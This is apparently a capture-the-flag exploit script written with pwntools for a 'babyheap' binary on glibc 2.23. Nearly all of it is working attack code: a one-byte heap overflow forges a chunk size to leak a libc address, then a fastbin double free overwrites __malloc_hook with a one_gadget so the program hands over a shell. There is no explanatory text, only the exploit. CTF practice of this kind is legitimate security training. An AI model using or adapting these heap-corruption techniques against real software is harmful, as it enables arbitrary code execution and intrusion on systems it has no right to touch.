from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	pass

def add(size):
	p.sendlineafter("Command: ","1")
	p.sendlineafter("Size: ",str(size))
	p.recvuntil("Allocated\n")

def edit(index,size,content):
	p.sendlineafter("Command: ","2")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",content)
	p.recvuntil("Updated\n")

def free(index):
	p.sendlineafter("Command: ","3")
	p.sendlineafter("Index: ",str(index))
	p.recvuntil("Deleted\n")

def show(index):
	p.sendlineafter("Command: ","4")
	p.sendlineafter("Index: ",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x11BB)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()

# free a large and then write to my chunk
size = 0x48
add(size) #0
add(size) #1
add(size) #2
add(size) #3
edit(0,size + 1,"a"*size + chr(size*2 + 0x10 + 1))
free(1)
add(size) #1
show(2)
p.recvuntil("Chunk[2]: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))

# fastbin double free to write main_area to write top chunk
size = 0x48
add(size) #4
add(size + 0x10) #5
free(5)
free(4)
free(3)
free(2)
log.success("__malloc_hook:"+hex(libc.symbols["__malloc_hook"]))
target = libc.symbols["__malloc_hook"] + 0x10 + 37
add(size) #2
edit(2,8,p64(target))
add(size) #3
add(size) #4
add(size) #5
payload = "aaa" + p64(0)*4 + p64(libc.symbols["__malloc_hook"]-0x10)
edit(5,len(payload),payload)
add(size) #6
one_gadget = libc.address + 0x4526a
#gdb.attach(p)
edit(6,8,p64(one_gadget))
p.sendlineafter("Command: ","1")
p.sendlineafter("Size: ","10")
p.interactive()
